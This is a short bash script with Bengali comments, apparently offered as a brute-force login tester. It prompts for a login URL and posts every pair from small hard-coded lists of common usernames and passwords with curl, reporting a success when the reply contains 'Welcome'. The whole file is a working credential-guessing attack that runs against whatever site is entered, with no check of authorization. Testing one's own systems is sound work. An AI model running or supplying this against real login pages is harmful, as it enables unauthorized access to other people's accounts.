#!/bin/bash

# ওয়েবসাইট URL ইনপুট নিন
echo "Enter Website URL for Brute Force Test (e.g., http://example.com/login):"
read URL

# ইউজারনেম এবং পাসওয়ার্ডের লিস্ট
USERNAMES=("admin" "root" "user" "test")
PASSWORDS=("123456" "password" "admin" "root")

for USER in "${USERNAMES[@]}"
do
    for PASS in "${PASSWORDS[@]}"
    do
        # ব্রুট ফোর্স করার জন্য প্যারামিটার তৈরি করা
        RESPONSE=$(curl -s -d "username=$USER&password=$PASS" $URL)

        # যদি লগইন সফল হয়, তাহলে ব্রুট ফোর্স ভ্যালনারেবিলিটি থাকতে পারে
        if echo $RESPONSE | grep -q "Welcome"; then
            echo "[+] Brute force success with username: $USER and password: $PASS"
        else
            echo "[-] Failed for username: $USER and password: $PASS"
        fi
    done
done
